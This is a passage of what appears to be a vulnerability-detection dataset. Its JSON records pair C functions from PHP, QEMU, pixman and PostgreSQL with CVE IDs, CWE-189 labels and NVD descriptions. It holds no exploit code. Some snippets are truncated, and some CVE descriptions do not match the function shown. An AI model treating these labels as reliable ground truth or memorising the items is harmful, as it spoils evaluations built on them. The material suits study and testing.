file descriptors or (2) integer values.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2015-1474"}
{"idx": 194591, "project": "php", "commit_id": "1ddf72180a52d247db88ea42a3e35f824a8fbda1", "project_url": "https://git.php.net/?p=php-src", "commit_url": "https://git.php.net/?p=php-src.git;a=commit;h=1ddf72180a52d247db88ea42a3e35f824a8fbda1", "commit_message": "None", "target": 0, "func": "static php_stream *phar_make_dirstream(char *dir, HashTable *manifest TSRMLS_DC) /* {{{ */\n{\n\tHashTable *data;\n\tint dirlen = strlen(dir);\n\tphar_zstr key;\n\tchar *entry, *found, *save, *str_key;\n\tuint keylen;\n\tulong unused;\n\n\tALLOC_HASHTABLE(data);\n\tzend_hash_init(data, 64, zend_get_hash_value, NULL, 0);\n\n\tif ((*dir == '/' && dirlen == 1 && (manifest->nNumOfElements == 0)) || (dirlen >= sizeof(\".phar\")-1 && !memcmp(dir, \".phar\", sizeof(\".phar\")-1))) {\n\t\t/* make empty root directory for empty phar */\n\t\t/* make empty directory for .phar magic directory */\n\t\tefree(dir);\n\t\treturn php_stream_alloc(&phar_dir_ops, data, NULL, \"r\");\n\t}\n\n        zend_hash_internal_pointer_reset(manifest);\n \n        while (FAILURE != zend_hash_has_more_elements(manifest)) {\n               if (HASH_KEY_NON_EXISTENT == zend_hash_get_current_key_ex(manifest, &key, &keylen, &unused, 0, NULL)) {\n                        break;\n                }\n \n\t\tPHAR_STR(key, str_key);\n\n\t\tif (keylen <= (uint)dirlen) {\n\t\t\tif (keylen < (uint)dirlen || !strncmp(str_key, dir, dirlen)) {\n\t\t\t\tPHAR_STR_FREE(str_key);\n\t\t\t\tif (SUCCESS != zend_hash_move_forward(manifest)) {\n\t\t\t\t\tbreak;\n\t\t\t\t}\n\t\t\t\tcontinue;\n\t\t\t}\n\t\t}\n\n\t\tif (*dir == '/') {\n\t\t\t/* root directory */\n\t\t\tif (keylen >= sizeof(\".phar\")-1 && !memcmp(str_key, \".phar\", sizeof(\".phar\")-1)) {\n\t\t\t\tPHAR_STR_FREE(str_key);\n\t\t\t\t/* do not add any magic entries to this directory */\n\t\t\t\tif (SUCCESS != zend_hash_move_forward(manifest)) {\n\t\t\t\t\tbreak;\n\t\t\t\t}\n\t\t\t\tcontinue;\n\t\t\t}\n\n\t\t\tif (NULL != (found = (char *) memchr(str_key, '/', keylen))) {\n\t\t\t\t/* the entry has a path separator and is a subdirectory */\n\t\t\t\tentry = (char *) safe_emalloc(found - str_key, 1, 1);\n\t\t\t\tmemcpy(entry, str_key, found - str_key);\n\t\t\t\tkeylen = found - str_key;\n\t\t\t\tentry[keylen] = '\\0';\n\t\t\t} else {\n\t\t\t\tentry = (char *) safe_emalloc(keylen, 1, 1);\n\t\t\t\tmemcpy(entry, str_key, keylen);\n\t\t\t\tentry[keylen] = '\\0';\n\t\t\t}\n\n\t\t\tPHAR_STR_FREE(str_key);\n\t\t\tgoto PHAR_ADD_ENTRY;\n\t\t} else {\n\t\t\tif (0 != memcmp(str_key, dir, dirlen)) {\n\t\t\t\t/* entry in directory not found */\n\t\t\t\tPHAR_STR_FREE(str_key);\n\t\t\t\tif (SUCCESS != zend_hash_move_forward(manifest)) {\n\t\t\t\t\tbreak;\n\t\t\t\t}\n\t\t\t\tcontinue;\n\t\t\t} else {\n\t\t\t\tif (str_key[dirlen] != '/') {\n\t\t\t\t\tPHAR_STR_FREE(str_key);\n\t\t\t\t\tif (SUCCESS != zend_hash_move_forward(manifest)) {\n\t\t\t\t\t\tbreak;\n\t\t\t\t\t}\n\t\t\t\t\tcontinue;\n\t\t\t\t}\n\t\t\t}\n\t\t}\n\n\t\tsave = str_key;\n\t\tsave += dirlen + 1; /* seek to just past the path separator */\n\n\t\tif (NULL != (found = (char *) memchr(save, '/', keylen - dirlen - 1))) {\n\t\t\t/* is subdirectory */\n\t\t\tsave -= dirlen + 1;\n\t\t\tentry = (char *) safe_emalloc(found - save + dirlen, 1, 1);\n\t\t\tmemcpy(entry, save + dirlen + 1, found - save - dirlen - 1);\n\t\t\tkeylen = found - save - dirlen - 1;\n\t\t\tentry[keylen] = '\\0';\n\t\t} else {\n\t\t\t/* is file */\n\t\t\tsave -= dirlen + 1;\n\t\t\tentry = (char *) safe_emalloc(keylen - dirlen, 1, 1);\n\t\t\tmemcpy(entry, save + dirlen + 1, keylen - dirlen - 1);\n\t\t\tentry[keylen - dirlen - 1] = '\\0';\n\t\t\tkeylen = keylen - dirlen - 1;\n\t\t}\n\t\tPHAR_STR_FREE(str_key);\nPHAR_ADD_ENTRY:\n\t\tif (keylen) {\n\t\t\tphar_add_empty(data, entry, keylen);\n\t\t}\n\n\t\tefree(entry);\n\n\t\tif (SUCCESS != zend_hash_move_forward(manifest)) {\n\t\t\tbreak;\n\t\t}\n\t}\n\n\tif (FAILURE != zend_hash_has_more_elements(data)) {\n\t\tefree(dir);\n\t\tif (zend_hash_sort(data, zend_qsort, phar_compare_dir_name, 0 TSRMLS_CC) == FAILURE) {\n\t\t\tFREE_HASHTABLE(data);\n\t\t\treturn NULL;\n\t\t}\n\t\treturn php_stream_alloc(&phar_dir_ops, data, NULL, \"r\");\n\t} else {\n\t\tefree(dir);\n\t\treturn php_stream_alloc(&phar_dir_ops, data, NULL, \"r\");\n\t}\n}\n/* }}}*/\n", "func_hash": 320716089711288249193405716054593776353, "file_name": "None", "file_hash": null, "cwe": ["CWE-189"], "cve": "CVE-2015-7804", "cve_desc": "Off-by-one error in the phar_parse_zipfile function in ext/phar/zip.c in PHP before 5.5.30 and 5.6.x before 5.6.14 allows remote attackers to cause a denial of service (uninitialized pointer dereference and application crash) by including the / filename in a .zip PHAR archive.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2015-7804"}
{"idx": 194592, "project": "php", "commit_id": "1ddf72180a52d247db88ea42a3e35f824a8fbda2", "project_url": "https://git.php.net/?p=php-src", "commit_url": "https://git.php.net/?p=php-src.git;a=commit;h=1ddf72180a52d247db88ea42a3e35f824a8fbda1", "commit_message": "None", "target": 0, "func": "void phar_add_virtual_dirs(phar_archive_data *phar, char *filename, int filename_len TSRMLS_DC) /* {{{ */\n{\n\tconst char *s;\n \n        while ((s = zend_memrchr(filename, '/', filename_len))) {\n                filename_len = s - filename;\n               if (!filename_len || FAILURE == zend_hash_add_empty_element(&phar->virtual_dirs, filename, filename_len)) {\n                        break;\n                }\n        }\n}\n/* }}} */\n", "func_hash": 126121217362549970600664177464454515734, "file_name": "None", "file_hash": null, "cwe": ["CWE-189"], "cve": "CVE-2015-7804", "cve_desc": "Off-by-one error in the phar_parse_zipfile function in ext/phar/zip.c in PHP before 5.5.30 and 5.6.x before 5.6.14 allows remote attackers to cause a denial of service (uninitialized pointer dereference and application crash) by including the / filename in a .zip PHAR archive.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2015-7804"}
{"idx": 194737, "project": "qemu", "commit_id": "fe3c546c5ff2a6210f9a4d8561cc64051ca8603e", "project_url": "https://github.com/bonzini/qemu", "commit_url": "https://git.qemu.org/?p=qemu.git;a=commit;h=fe3c546c5ff2a6210f9a4d8561cc64051ca8603e", "commit_message": "usb: check RNDIS buffer offsets & length\n\nWhen processing remote NDIS control message packets,\nthe USB Net device emulator uses a fixed length(4096) data buffer.\nThe incoming informationBufferOffset & Length combination could\noverflow and cross that range. Check control message buffer\noffsets and length to avoid it.\n\nReported-by: Qinghao Tang <luodalongde@gmail.com>\nSigned-off-by: Prasad J Pandit <pjp@fedoraproject.org>\nMessage-id: 1455648821-17340-3-git-send-email-ppandit@redhat.com\nSigned-off-by: Gerd Hoffmann <kraxel@redhat.com>", "target": 0, "func": "static int rndis_query_response(USBNetState *s,\n                rndis_query_msg_type *buf, unsigned int length)\n{\n    rndis_query_cmplt_type *resp;\n    /* oid_supported_list is the largest data reply */\n    uint8_t infobuf[sizeof(oid_supported_list)];\n    uint32_t bufoffs, buflen;\n    int infobuflen;\n    unsigned int resplen;\n \n     bufoffs = le32_to_cpu(buf->InformationBufferOffset) + 8;\n     buflen = le32_to_cpu(buf->InformationBufferLength);\n    if (buflen > length || bufoffs >= length || bufoffs + buflen > length) {\n         return USB_RET_STALL;\n    }\n \n     infobuflen = ndis_query(s, le32_to_cpu(buf->OID),\n                             bufoffs + (uint8_t *) buf, buflen, infobuf,\n    resplen = sizeof(rndis_query_cmplt_type) +\n            ((infobuflen < 0) ? 0 : infobuflen);\n    resp = rndis_queue_response(s, resplen);\n    if (!resp)\n        return USB_RET_STALL;\n\n    resp->MessageType = cpu_to_le32(RNDIS_QUERY_CMPLT);\n    resp->RequestID = buf->RequestID; /* Still LE in msg buffer */\n    resp->MessageLength = cpu_to_le32(resplen);\n\n    if (infobuflen < 0) {\n        /* OID not supported */\n        resp->Status = cpu_to_le32(RNDIS_STATUS_NOT_SUPPORTED);\n        resp->InformationBufferLength = cpu_to_le32(0);\n        resp->InformationBufferOffset = cpu_to_le32(0);\n        return 0;\n    }\n\n    resp->Status = cpu_to_le32(RNDIS_STATUS_SUCCESS);\n    resp->InformationBufferOffset =\n            cpu_to_le32(infobuflen ? sizeof(rndis_query_cmplt_type) - 8 : 0);\n    resp->InformationBufferLength = cpu_to_le32(infobuflen);\n    memcpy(resp + 1, infobuf, infobuflen);\n\n    return 0;\n}\n", "func_hash": 258081463858313307926739397365092249284, "file_name": "None", "file_hash": null, "cwe": ["CWE-189"], "cve": "CVE-2016-2538", "cve_desc": "Multiple integer overflows in the USB Net device emulator (hw/usb/dev-network.c) in QEMU before 2.5.1 allow local guest OS administrators to cause a denial of service (QEMU process crash) or obtain sensitive host memory information via a remote NDIS control message packet that is mishandled in the (1) rndis_query_response, (2) rndis_set_response, or (3) usb_net_handle_dataout function.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2016-2538"}
{"idx": 194738, "project": "qemu", "commit_id": "fe3c546c5ff2a6210f9a4d8561cc64051ca8603e", "project_url": "https://github.com/bonzini/qemu", "commit_url": "https://git.qemu.org/?p=qemu.git;a=commit;h=fe3c546c5ff2a6210f9a4d8561cc64051ca8603e", "commit_message": "usb: check RNDIS buffer offsets & length\n\nWhen processing remote NDIS control message packets,\nthe USB Net device emulator uses a fixed length(4096) data buffer.\nThe incoming informationBufferOffset & Length combination could\noverflow and cross that range. Check control message buffer\noffsets and length to avoid it.\n\nReported-by: Qinghao Tang <luodalongde@gmail.com>\nSigned-off-by: Prasad J Pandit <pjp@fedoraproject.org>\nMessage-id: 1455648821-17340-3-git-send-email-ppandit@redhat.com\nSigned-off-by: Gerd Hoffmann <kraxel@redhat.com>", "target": 0, "func": "static int rndis_set_response(USBNetState *s,\n                rndis_set_msg_type *buf, unsigned int length)\n{\n    rndis_set_cmplt_type *resp =\n            rndis_queue_response(s, sizeof(rndis_set_cmplt_type));\n    uint32_t bufoffs, buflen;\n    int ret;\n\n    if (!resp)\n        return USB_RET_STALL;\n\n \n     bufoffs = le32_to_cpu(buf->InformationBufferOffset) + 8;\n     buflen = le32_to_cpu(buf->InformationBufferLength);\n    if (buflen > length || bufoffs >= length || bufoffs + buflen > length) {\n         return USB_RET_STALL;\n    }\n \n     ret = ndis_set(s, le32_to_cpu(buf->OID),\n                     bufoffs + (uint8_t *) buf, buflen);\n    resp->MessageLength = cpu_to_le32(sizeof(rndis_set_cmplt_type));\n    if (ret < 0) {\n        /* OID not supported */\n        resp->Status = cpu_to_le32(RNDIS_STATUS_NOT_SUPPORTED);\n        return 0;\n    }\n    resp->Status = cpu_to_le32(RNDIS_STATUS_SUCCESS);\n\n    return 0;\n}\n", "func_hash": 310886160322124680980410012001304473905, "file_name": "None", "file_hash": null, "cwe": ["CWE-189"], "cve": "CVE-2016-2538", "cve_desc": "Multiple integer overflows in the USB Net device emulator (hw/usb/dev-network.c) in QEMU before 2.5.1 allow local guest OS administrators to cause a denial of service (QEMU process crash) or obtain sensitive host memory information via a remote NDIS control message packet that is mishandled in the (1) rndis_query_response, (2) rndis_set_response, or (3) usb_net_handle_dataout function.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2016-2538"}
{"idx": 194773, "project": "pixman", "commit_id": "857e40f3d2bc2cfb714913e0cd7e6184cf69aca3", "project_url": "https://cgit.freedesktop.org/pixman/commit/?id=857e40f3d2bc2cfb714913e0cd7e6184cf69aca3", "commit_url": "https://cgit.freedesktop.org/pixman/commit/?id=857e40f3d2bc2cfb714913e0cd7e6184cf69aca3", "commit_message": "None", "target": 0, "func": "create_bits (pixman_format_code_t format,\n             int                  width,\n             int                  height,\n             int *\t\t  rowstride_bytes,\n\t     pixman_bool_t\t  clear)\n{\n    int stride;\n    size_t buf_size;\n    int bpp;\n\n    /* what follows is a long-winded way, avoiding any possibility of integer\n     * overflows, of saying:\n     * stride = ((width * bpp + 0x1f) >> 5) * sizeof (uint32_t);\n     */\n\n    bpp = PIXMAN_FORMAT_BPP (format);\n    if (_pixman_multiply_overflows_int (width, bpp))\n\treturn NULL;\n\n    stride = width * bpp;\n    if (_pixman_addition_overflows_int (stride, 0x1f))\n\treturn NULL;\n\n    stride += 0x1f;\n    stride >>= 5;\n\n    stride *= sizeof (uint32_t);\n\n     if (_pixman_multiply_overflows_size (height, stride))\n \treturn NULL;\n \n    buf_size = (size_t)height * stride;\n \n     if (rowstride_bytes)\n \t*rowstride_bytes = stride;\n\n    if (clear)\n\treturn calloc (buf_size, 1);\n    else\n\treturn malloc (buf_size);\n}\n", "func_hash": 241257217184630167984711943159412204678, "file_name": "None", "file_hash": null, "cwe": ["CWE-189"], "cve": "CVE-2014-9766", "cve_desc": "Integer overflow in the create_bits function in pixman-bits-image.c in Pixman before 0.32.6 allows remote attackers to cause a denial of service (application crash) or possibly execute arbitrary code via large height and stride values.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2014-9766"}
{"idx": 194829, "project": "postgres", "commit_id": "31400a673325147e1205326008e32135a78b4d8a", "project_url": "https://github.com/postgres/postgres", "commit_url": "https://github.com/postgres/postgres/commit/31400a673325147e1205326008e32135a78b4d8a", "commit_message": "Predict integer overflow to avoid buffer overruns.\n\nSeveral functions, mostly type input functions, calculated an allocation\nsize such that the calculation wrapped to a small positive value when\narguments implied a sufficiently-large requirement.  Writes past the end\nof the inadvertent small allocation followed shortly thereafter.\nCoverity identified the path_in() vulnerability; code inspection led to\nthe rest.  In passing, add check_stack_depth() to prevent stack overflow\nin related functions.\n\nBack-patch to 8.4 (all supported versions).  The non-comment hstore\nchanges touch code that did not exist in 8.4, so that part stops at 9.0.\n\nNoah Misch and Heikki Linnakangas, reviewed by Tom Lane.\n\nSecurity: CVE-2014-0064", "target": 0, "func": "hstore_from_array(PG_FUNCTION_ARGS)\n{\n\tArrayType  *in_array = PG_GETARG_ARRAYTYPE_P(0);\n\tint\t\t\tndims = ARR_NDIM(in_array);\n\tint\t\t\tcount;\n\tint32\t\tbuflen;\n\tHStore\t   *out;\n\tPairs\t   *pairs;\n\tDatum\t   *in_datums;\n\tbool\t   *in_nulls;\n\tint\t\t\tin_count;\n\tint\t\t\ti;\n\n\tAssert(ARR_ELEMTYPE(in_array) == TEXTOID);\n\n\tswitch (ndims)\n\t{\n\t\tcase 0:\n\t\t\tout = hstorePairs(NULL, 0, 0);\n\t\t\tPG_RETURN_POINTER(out);\n\n\t\tcase 1:\n\t\t\tif ((ARR_DIMS(in_array)[0]) % 2)\n\t\t\t\tereport(ERROR,\n\t\t\t\t\t\t(errcode(ERRCODE_ARRAY_SUBSCRIPT_ERROR),\n\t\t\t\t\t\t errmsg(\"array must have even number of elements\")));\n\t\t\tbreak;\n\n\t\tcase 2:\n\t\t\tif ((ARR_DIMS(in_array)[1]) != 2)\n\t\t\t\tereport(ERROR,\n\t\t\t\t\t\t(errcode(ERRCODE_ARRAY_SUBSCRIPT_ERROR),\n\t\t\t\t\t\t errmsg(\"array must have two columns\")));\n\t\t\tbreak;\n\n\t\tdefault:\n\t\t\tereport(ERROR,\n\t\t\t\t\t(errcode(ERRCODE_ARRAY_SUBSCRIPT_ERROR),\n\t\t\t\t\t errmsg(\"wrong number of array subscripts\")));\n\t}\n\n\tdeconstruct_array(in_array,\n\t\t\t\t\t  TEXTOID, -1, false, 'i',\n\t\t\t\t\t  &in_datums, &in_nulls, &in_count);\n \n \tcount = in_count / 2;\n \n\t/* see discussion in hstoreArrayToPairs() */\n\tif (count > MaxAllocSize / sizeof(Pairs))\n\t\tereport(ERROR,\n\t\t\t\t(errcode(ERRCODE_PROGRAM_LIMIT_EXCEEDED),\n\t\t\t  errmsg(\"number of pairs (%d) exceeds the maximum allowed (%d)\",\n\t\t\t\t\t count, (int) (MaxAllocSize / sizeof(Pairs)))));\n\n \tpairs = palloc(count * sizeof(Pairs));\n \n \tfor (i = 0; i < count; ++i)\n\t{\n\t\tif (in_nulls[i * 2])\n\t\t\tereport(ERROR,\n\t\t\t\t\t(errcode(ERRCODE_NULL_VALUE_NOT_ALLOWED),\n\t\t\t\t\t errmsg(\"null value not allowed for hstore key\")));\n\n\t\tif (in_nulls[i * 2 + 1])\n\t\t{\n\t\t\tpairs[i].key = VARDATA_ANY(in_datums[i * 2]);\n\t\t\tpairs[i].val = NULL;\n\t\t\tpairs[i].keylen = hstoreCheckKeyLen(VARSIZE_ANY_EXHDR(in_datums[i * 2]));\n\t\t\tpairs[i].vallen = 4;\n\t\t\tpairs[i].isnull = true;\n\t\t\tpairs[i].needfree = false;\n\t\t}\n\t\telse\n\t\t{\n\t\t\tpairs[i].key = VARDATA_ANY(in_datums[i * 2]);\n\t\t\tpairs[i].val = VARDATA_ANY(in_datums[i * 2 + 1]);\n\t\t\tpairs[i].keylen = hstoreCheckKeyLen(VARSIZE_ANY_EXHDR(in_datums[i * 2]));\n\t\t\tpairs[i].vallen = hstoreCheckValLen(VARSIZE_ANY_EXHDR(in_datums[i * 2 + 1]));\n\t\t\tpairs[i].isnull = false;\n\t\t\tpairs[i].needfree = false;\n\t\t}\n\t}\n\n\tcount = hstoreUniquePairs(pairs, count, &buflen);\n\n\tout = hstorePairs(pairs, count, buflen);\n\n\tPG_RETURN_POINTER(out);\n}\n", "func_hash": 64623284569112216145711505698807498964, "file_name": "hstore_io.c", "file_hash": 21919448174558754325086088597898271612, "cwe": ["CWE-189"], "cve": "CVE-2014-0064", "cve_desc": "Multiple integer overflows in the path_in and other unspecified functions in PostgreSQL before 8.4.20, 9.0.x before 9.0.16, 9.1.x before 9.1.12, 9.2.x before 9.2.7, and 9.3.x before 9.3.3 allow remote authenticated users to have unspecified impact and attack vectors, which trigger a buffer overflow.  NOTE: this identifier has been SPLIT due to different affected versions; use CVE-2014-2669 for the hstore vector.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2014-0064"}
{"idx": 194830, "project": "postgres", "commit_id": "31400a673325147e1205326008e32135a78b4d8a", "project_url": "https://github.com/postgres/postgres", "commit_url": "https://github.com/postgres/postgres/commit/31400a673325147e1205326008e32135a78b4d8a", "commit_message": "Predict integer overflow to avoid buffer overruns.\n\nSeveral functions, mostly type input functions, calculated an allocation\nsize such that the calculation wrapped to a small positive value when\narguments implied a sufficiently-large requirement.  Writes past the end\nof the inadvertent small allocation followed shortly thereafter.\nCoverity identified the path_in() vulnerability; code inspection led to\nthe rest.  In passing, add check_stack_depth() to prevent stack overflow\nin related functions.\n\nBack-patch to 8.4 (all supported versions).  The non-comment hstore\nchanges touch code that did not exist in 8.4, so that part stops at 9.0.\n\nNoah Misch and Heikki Linnakangas, reviewed by Tom Lane.\n\nSecurity: CVE-2014-0064", "target": 0, "func": "hstore_from_arrays(PG_FUNCTION_ARGS)\n{\n\tint32\t\tbuflen;\n\tHStore\t   *out;\n\tPairs\t   *pairs;\n\tDatum\t   *key_datums;\n\tbool\t   *key_nulls;\n\tint\t\t\tkey_count;\n\tDatum\t   *value_datums;\n\tbool\t   *value_nulls;\n\tint\t\t\tvalue_count;\n\tArrayType  *key_array;\n\tArrayType  *value_array;\n\tint\t\t\ti;\n\n\tif (PG_ARGISNULL(0))\n\t\tPG_RETURN_NULL();\n\n\tkey_array = PG_GETARG_ARRAYTYPE_P(0);\n\n\tAssert(ARR_ELEMTYPE(key_array) == TEXTOID);\n\n\t/*\n\t * must check >1 rather than != 1 because empty arrays have 0 dimensions,\n\t * not 1\n\t */\n\n\tif (ARR_NDIM(key_array) > 1)\n\t\tereport(ERROR,\n\t\t\t\t(errcode(ERRCODE_ARRAY_SUBSCRIPT_ERROR),\n\t\t\t\t errmsg(\"wrong number of array subscripts\")));\n\n\tdeconstruct_array(key_array,\n \t\t\t\t\t  TEXTOID, -1, false, 'i',\n \t\t\t\t\t  &key_datums, &key_nulls, &key_count);\n \n\t/* see discussion in hstoreArrayToPairs() */\n\tif (key_count > MaxAllocSize / sizeof(Pairs))\n\t\tereport(ERROR,\n\t\t\t\t(errcode(ERRCODE_PROGRAM_LIMIT_EXCEEDED),\n\t\t\t  errmsg(\"number of pairs (%d) exceeds the maximum allowed (%d)\",\n\t\t\t\t\t key_count, (int) (MaxAllocSize / sizeof(Pairs)))));\n\n \t/* value_array might be NULL */\n \n \tif (PG_ARGISNULL(1))\n\t{\n\t\tvalue_array = NULL;\n\t\tvalue_count = key_count;\n\t\tvalue_datums = NULL;\n\t\tvalue_nulls = NULL;\n\t}\n\telse\n\t{\n\t\tvalue_array = PG_GETARG_ARRAYTYPE_P(1);\n\n\t\tAssert(ARR_ELEMTYPE(value_array) == TEXTOID);\n\n\t\tif (ARR_NDIM(value_array) > 1)\n\t\t\tereport(ERROR,\n\t\t\t\t\t(errcode(ERRCODE_ARRAY_SUBSCRIPT_ERROR),\n\t\t\t\t\t errmsg(\"wrong number of array subscripts\")));\n\n\t\tif ((ARR_NDIM(key_array) > 0 || ARR_NDIM(value_array) > 0) &&\n\t\t\t(ARR_NDIM(key_array) != ARR_NDIM(value_array) ||\n\t\t\t ARR_DIMS(key_array)[0] != ARR_DIMS(value_array)[0] ||\n\t\t\t ARR_LBOUND(key_array)[0] != ARR_LBOUND(value_array)[0]))\n\t\t\tereport(ERROR,\n\t\t\t\t\t(errcode(ERRCODE_ARRAY_SUBSCRIPT_ERROR),\n\t\t\t\t\t errmsg(\"arrays must have same bounds\")));\n\n\t\tdeconstruct_array(value_array,\n\t\t\t\t\t\t  TEXTOID, -1, false, 'i',\n\t\t\t\t\t\t  &value_datums, &value_nulls, &value_count);\n\n\t\tAssert(key_count == value_count);\n\t}\n\n\tpairs = palloc(key_count * sizeof(Pairs));\n\n\tfor (i = 0; i < key_count; ++i)\n\t{\n\t\tif (key_nulls[i])\n\t\t\tereport(ERROR,\n\t\t\t\t\t(errcode(ERRCODE_NULL_VALUE_NOT_ALLOWED),\n\t\t\t\t\t errmsg(\"null value not allowed for hstore key\")));\n\n\t\tif (!value_nulls || value_nulls[i])\n\t\t{\n\t\t\tpairs[i].key = VARDATA_ANY(key_datums[i]);\n\t\t\tpairs[i].val = NULL;\n\t\t\tpairs[i].keylen = hstoreCheckKeyLen(VARSIZE_ANY_EXHDR(key_datums[i]));\n\t\t\tpairs[i].vallen = 4;\n\t\t\tpairs[i].isnull = true;\n\t\t\tpairs[i].needfree = false;\n\t\t}\n\t\telse\n\t\t{\n\t\t\tpairs[i].key = VARDATA_ANY(key_datums[i]);\n\t\t\tpairs[i].val = VARDATA_ANY(value_datums[i]);\n\t\t\tpairs[i].keylen = hstoreCheckKeyLen(VARSIZE_ANY_EXHDR(key_datums[i]));\n\t\t\tpairs[i].vallen = hstoreCheckValLen(VARSIZE_ANY_EXHDR(value_datums[i]));\n\t\t\tpairs[i].isnull = false;\n\t\t\tpairs[i].needfree = false;\n\t\t}\n\t}\n\n\tkey_count = hstoreUniquePairs(pairs, key_count, &buflen);\n\n\tout = hstorePairs(pairs, key_count, buflen);\n\n\tPG_RETURN_POINTER(out);\n}\n", "func_hash": 111412007291673780820042060074769484484, "file_name": "hstore_io.c", "file_hash": 21919448174558754325086088597898271612, "cwe": ["CWE-189"], "cve": "CVE-2014-0064", "cve_desc": "Multiple integer overflows in the path_in and other unspecified functions in PostgreSQL before 8.4.20, 9.0.x before 9.0.16, 9.1.x before 9.1.12, 9.2.x before 9.2.7, and 9.3.x before 9.3.3 allow remote authenticated users to have unspecified impact and attack vectors, which trigger a buffer overflow.  NOTE: this identifier has been SPLIT due to different affected versions; use CVE-2014-2669 for the hstore vector.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2014-0064"}
{"idx": 194832, "project": "postgres", "commit_id": "31400a673325147e1205326008e32135a78b4d8a", "project_url": "https://github.com/postgres/postgres", "commit_url": "https://github.com/postgres/postgres/commit/31400a673325147e1205326008e32135a78b4d8a", "commit_message": "Predict integer overflow to avoid buffer overruns.\n\nSeveral functions, mostly type input functions, calculated an allocation\nsize such that the calculation wrapped to a small positive value when\narguments implied a sufficiently-large requirement.  Writes past the end\nof the inadvertent small allocation followed shortly thereafter.\nCoverity identified the path_in() vulnerability; code inspection led to\nthe rest.  In passing, add check_stack_depth() to prevent stack overflow\nin related functions.\n\nBack-patch to 8.4 (all supported versions).  The non-comment hstore\nchanges touch code that did not exist in 8.4, so that part stops at 9.0.\n\nNoah Misch and Heikki Linnakangas, reviewed by Tom Lane.\n\nSecurity: CVE-2014-0064", "target": 0, "func": "hstore_recv(PG_FUNCTION_ARGS)\n{\n\tint32\t\tbuflen;\n\tHStore\t   *out;\n\tPairs\t   *pairs;\n\tint32\t\ti;\n\tint32\t\tpcount;\n\tStringInfo\tbuf = (StringInfo) PG_GETARG_POINTER(0);\n\n\tpcount = pq_getmsgint(buf, 4);\n\n\tif (pcount == 0)\n\t{\n\t\tout = hstorePairs(NULL, 0, 0);\n \t\tPG_RETURN_POINTER(out);\n \t}\n \n\tif (pcount < 0 || pcount > MaxAllocSize / sizeof(Pairs))\n\t\tereport(ERROR,\n\t\t\t\t(errcode(ERRCODE_PROGRAM_LIMIT_EXCEEDED),\n\t\t\t  errmsg(\"number of pairs (%d) exceeds the maximum allowed (%d)\",\n\t\t\t\t\t pcount, (int) (MaxAllocSize / sizeof(Pairs)))));\n \tpairs = palloc(pcount * sizeof(Pairs));\n \n \tfor (i = 0; i < pcount; ++i)\n\t{\n\t\tint\t\t\trawlen = pq_getmsgint(buf, 4);\n\t\tint\t\t\tlen;\n\n\t\tif (rawlen < 0)\n\t\t\tereport(ERROR,\n\t\t\t\t\t(errcode(ERRCODE_NULL_VALUE_NOT_ALLOWED),\n\t\t\t\t\t errmsg(\"null value not allowed for hstore key\")));\n\n\t\tpairs[i].key = pq_getmsgtext(buf, rawlen, &len);\n\t\tpairs[i].keylen = hstoreCheckKeyLen(len);\n\t\tpairs[i].needfree = true;\n\n\t\trawlen = pq_getmsgint(buf, 4);\n\t\tif (rawlen < 0)\n\t\t{\n\t\t\tpairs[i].val = NULL;\n\t\t\tpairs[i].vallen = 0;\n\t\t\tpairs[i].isnull = true;\n\t\t}\n\t\telse\n\t\t{\n\t\t\tpairs[i].val = pq_getmsgtext(buf, rawlen, &len);\n\t\t\tpairs[i].vallen = hstoreCheckValLen(len);\n\t\t\tpairs[i].isnull = false;\n\t\t}\n\t}\n\n\tpcount = hstoreUniquePairs(pairs, pcount, &buflen);\n\n\tout = hstorePairs(pairs, pcount, buflen);\n\n\tPG_RETURN_POINTER(out);\n}\n", "func_hash": 143753466148318875574908246024547989001, "file_name": "hstore_io.c", "file_hash": 21919448174558754325086088597898271612, "cwe": ["CWE-189"], "cve": "CVE-2014-0064", "cve_desc": "Multiple integer overflows in the path_in and other unspecified functions in PostgreSQL before 8.4.20, 9.0.x before 9.0.16, 9.1.x before 9.1.12, 9.2.x before 9.2.7, and 9.3.x before 9.3.3 allow remote authenticated users to have unspecified impact and attack vectors, which trigger a buffer overflow.  NOTE: this identifier has been SPLIT due to different affected versions; use CVE-2014-2669 for the hstore vector.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2014-0064"}
{"idx": 194833, "project": "postgres", "commit_id": "31400a673325147e1205326008e32135a78b4d8a", "project_url": "https://github.com/postgres/postgres", "commit_url": "https://github.com/postgres/postgres/commit/31400a673325147e1205326008e32135a78b4d8a", "commit_message": "Predict integer overflow to avoid buffer overruns.\n\nSeveral functions, mostly type input functions, calculated an allocation\nsize such that the calculation wrapped to a small positive value when\narguments implied a sufficiently-large requirement.  Writes past the end\nof the inadvertent small allocation followed shortly thereafter.\nCoverity identified the path_in() vulnerability; code inspection led to\nthe rest.  In passing, add check_stack_depth() to prevent stack overflow\nin related functions.\n\nBack-patch to 8.4 (all supported versions).  The non-comment hstore\nchanges touch code that did not exist in 8.4, so that part stops at 9.0.\n\nNoah Misch and Heikki Linnakangas, reviewed by Tom Lane.\n\nSecurity: CVE-2014-0064", "target": 0, "func": "hstoreArrayToPairs(ArrayType *a, int *npairs)\n{\n\tDatum\t   *key_datums;\n\tbool\t   *key_nulls;\n\tint\t\t\tkey_count;\n\tPairs\t   *key_pairs;\n\tint\t\t\tbufsiz;\n\tint\t\t\ti,\n\t\t\t\tj;\n\n\tdeconstruct_array(a,\n\t\t\t\t\t  TEXTOID, -1, false, 'i',\n\t\t\t\t\t  &key_datums, &key_nulls, &key_count);\n\n\tif (key_count == 0)\n\t{\n\t\t*npairs = 0;\n \t\treturn NULL;\n \t}\n \n\t/*\n\t * A text array uses at least eight bytes per element, so any overflow in\n\t * \"key_count * sizeof(Pairs)\" is small enough for palloc() to catch.\n\t * However, credible improvements to the array format could invalidate\n\t * that assumption.  Therefore, use an explicit check rather than relying\n\t * on palloc() to complain.\n\t */\n\tif (key_count > MaxAllocSize / sizeof(Pairs))\n\t\tereport(ERROR,\n\t\t\t\t(errcode(ERRCODE_PROGRAM_LIMIT_EXCEEDED),\n\t\t\t  errmsg(\"number of pairs 